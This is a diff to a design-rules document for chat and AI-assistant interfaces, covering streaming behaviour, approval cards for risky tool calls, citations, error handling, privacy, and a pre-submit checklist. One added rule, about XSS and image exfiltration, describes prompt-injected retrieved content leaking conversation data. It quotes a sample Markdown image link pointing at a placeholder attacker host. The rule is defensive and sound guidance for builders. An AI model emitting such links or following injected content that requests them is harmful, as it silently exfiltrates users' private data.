@@ -39,18 +39,18 @@ Let the message carry the essential meaning as scannable text, then offer the ne
 | Concern | Rule |
 |---|---|
 | platform truth | Verify limits, component flags, and SDK versions against current official docs; never copy stale blog limits or deprecated v4/tuple idioms. |
-| progressive disclosure | Lead with the answer and primary action; collapse multi-step traces or move deep detail into threads, modals, mini apps, or split artifacts. |
-| state integrity | Separate ephemeral/private errors from persistent/shared channel records; never leak private context into shared rooms. |
-| action safety | Destructive, financial, or external side effects require explicit human approval, server-side authorization, and idempotency against double-taps/replays. |
-| accessibility | Name every control by outcome (`Approve invoice #1042`); never rely on color/emoji alone or put `aria-live="assertive"` on token-by-token text nodes. |
-| privacy & security | Validate webhook signatures, `initData` HMAC, ID tokens, and callback payloads server-side; sanitize streamed Markdown/HTML against XSS. |
-| anti-slop | Reject fake typing delays, fabricated "thinking…" steps, wall-of-text replies, emoji bullet spam, dead buttons, and cheerful filler before the answer. |
+| stream ergonomics & AST budget | Keep auto-scroll sticky **only within `~48–80 px` of bottom** with a floating `"Jump to bottom"` pill, **throttle Markdown AST re-parses (`~30–50 ms` / `rAF`)**, and **keep the composer input editable while streaming** (toggle `Send` <-> `Stop` `AbortController`, never `disabled={isBusy}`). |
+| XSS & Markdown image exfiltration defense | Sanitize HTML/links **AND enforce strict `CSP img-src` allowlisting, signed image proxy, or click-to-load** on untrusted Markdown images (`![leak](https://attacker.tld/steal?secret=...)`) so prompt-injected RAG content cannot silently exfiltrate conversation data on render! |
+| human-in-the-loop (`HITL`) & action safety | Gate destructive, financial, or external tool calls behind an idempotent inline approval card rendering a **human-readable `Before -> After` diff + exact target & parameters** with `Approve once` / `Edit` / `Reject`—never blind raw JSON. |
+| grounded citations | Inline citations must click-to-scroll and highlight exact retrieved source passages; refuse to fabricate URLs or ungrounded confidence badges. |
+| recovery, `429` & warm escalation | Render **3-part recovery errors (*What failed / Why / Next action*)**, **`429` rate-limit countdown / automatic queue**, **context-window compaction indicators**, and **warm human-support escalation** (forwarding a structured transcript summary so the user never repeats themselves). |
+| privacy, retention & accessibility | Validate webhooks/`initData`/tokens server-side, surface explicit **data retention / model-training disclosure + one-click Thread Delete**, name controls by outcome, and never put `aria-live="assertive"` on token-by-token text nodes. |
 
 ## Pre-submit checklist
 
-- [ ] Track A host/schema versions or Track B SDK/protocol versions are explicitly verified;
-- [ ] payload limits, UTF-8 byte bounds, and 3 s ack / resume lifecycles are respected;
-- [ ] rich cards degrade cleanly to plain-text fallback, and streamed Markdown closes fences safely without XSS;
-- [ ] loading, streaming, stopped, expired, retry, unauthorized, and already-completed states are handled;
-- [ ] callback payloads, tokens, and tool approvals are validated server-side and idempotent;
-- [ ] light/dark, mobile/desktop, scroll-yield, and keyboard paths are verified (`rendered`) or explicitly labeled `not-checked`.
+- [ ] Track A host/schema versions or Track B SDK/protocol versions explicitly verified;
+- [ ] Track B composer stays **editable during streaming** (`Send` <-> `Stop` `AbortController`), scroll yields outside `48–80 px` of bottom (`"Jump to bottom"`), and Markdown AST updates throttle at `~30–50 ms` / `rAF`;
+- [ ] HTML XSS **and** Markdown `![](https://...)` **data-exfiltration defense** (`CSP img-src` allowlist / proxy / click-to-load) enforced;
+- [ ] `HITL` tool cards show human-readable **`Before -> After` diffs** (`Approve once` / `Edit` / `Reject`) idempotently, and inline citations scroll/highlight verified source passages;
+- [ ] **3-part errors**, **`429` countdown/queue**, **context compaction banner**, **warm human handoff with summary**, and **data-retention / Thread Delete** controls wired;
+- [ ] light/dark, `390 px` mobile, keyboard/screen-reader, and Track A `3 s` ack + plain-text fallback verified (`rendered` vs `static` vs `not-checked`).
